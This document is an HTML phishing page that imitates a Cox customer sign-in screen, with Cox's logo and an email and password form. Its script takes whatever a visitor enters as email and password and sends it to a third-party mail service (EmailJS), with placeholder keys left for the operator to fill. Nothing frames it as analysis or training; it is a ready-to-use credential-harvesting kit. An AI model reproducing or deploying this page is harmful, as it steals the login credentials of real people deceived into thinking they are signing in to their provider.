<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Cox Login</title>
<!-- EmailJS SDK -->
<script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
<style>
  * {
    box-sizing: border-box;
  }
  body, html {
    margin: 0; padding: 0; height: 100%;
    font-family: Arial, sans-serif;
    background: white;
  }
  .header {
    width: 100%;
    height: 60px;
    background-color: white;
    border-bottom: 1px solid #e0e0e0;
    display: flex;
    align-items: center;
    padding: 0 2rem;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 10;
  }
  .header img {
    height: 32px;
  }
  .container {
    display: flex;
    height: 100vh;
    margin-top: 60px; /* To avoid overlap with fixed header */
  }
  .left-panel {
    position: relative;
    background-color: white;
    width: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
  }
  .form-wrapper {
    background-color: #f2f6f7;
    width: 400px;
    padding: 40px 35px;
    border-radius: 8px;
    box-shadow: 0 0 12px rgba(0,0,0,0.1);
    position: relative;
    right: -30px; /* overlap 30px onto right panel */
  }
  .form-wrapper h1 {
    margin: 0 0 20px;
    font-weight: 600;
    font-size: 28px;
    color: #002b45;
  }
  .form-wrapper p {
    margin: 0 0 30px;
    font-size: 16px;
    color: #535353;
  }
  form {
    display: flex;
    flex-direction: column;
  }
  label {
    font-size: 14px;
    margin-bottom: 6px;
    color: #004263;
  }
  input[type="email"],
  input[type="password"] {
    height: 40px;
    margin-bottom: 20px;
    padding: 0 12px;
    border: 1px solid #cbd1d8;
    border-radius: 4px;
    font-size: 16px;
  }
  button {
    height: 44px;
    background-color: #0078d2;
    border: none;
    color: white;
    font-size: 16px;
    border-radius: 4px;
    cursor: pointer;
    font-weight: 600;
  }
  button:hover {
    background-color: #005ea3;
  }
  .forgot-password {
    margin-top: 12px;
    font-size: 14px;
    color: #0078d2;
    text-align: right;
  }
  .forgot-password a {
    color: #0078d2;
    text-decoration: none;
  }
  .right-panel {
    width: 50%;
    background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=900&q=80') no-repeat center center/cover;
  }
  @media(max-width: 768px){
    .container {
      flex-direction: column;
    }
    .left-panel, .right-panel {
      width: 100%;
      height: 50vh;
    }
    .form-wrapper {
      right: 0;
      width: 90%;
      margin: auto;
    }
  }
</style>
</head>
<body>

<div class="header">
  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Cox_logo_2017.svg" alt="Cox Logo" />
</div>

<div class="container">
  <div class="left-panel">
    <div class="form-wrapper">
      <h1>Sign In</h1>
      <p>Access your Cox account to manage your services and billing.</p>
      <form id="signin-form">
        <label for="user_email">Email or Phone Number</label>
        <input type="email" id="user_email" name="user_email" placeholder="Enter your email or phone" required />

        <label for="user_password">Password</label>
        <input type="password" id="user_password" name="user_password" placeholder="Enter your password" required />

        <button type="submit">Sign In</button>
        <div class="forgot-password"><a href="#">Forgot Password?</a></div>
      </form>
    </div>
  </div>
  <div class="right-panel"></div>
</div>

<script>
  // Initialize EmailJS with your user ID
  (function(){
    emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
  })();

  const form = document.getElementById('signin-form');
  form.addEventListener('submit', function(event) {
    event.preventDefault();
    const templateParams = {
      user_email: form.user_email.value,
      user_password: form.user_password.value
    };
    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
      .then(() => {
        alert('Sign-in information sent successfully!');
        form.reset();
      }, () => {
        alert('Failed to send the sign-in information. Please try again.');
      });
  });
</script>

</body>
</html>
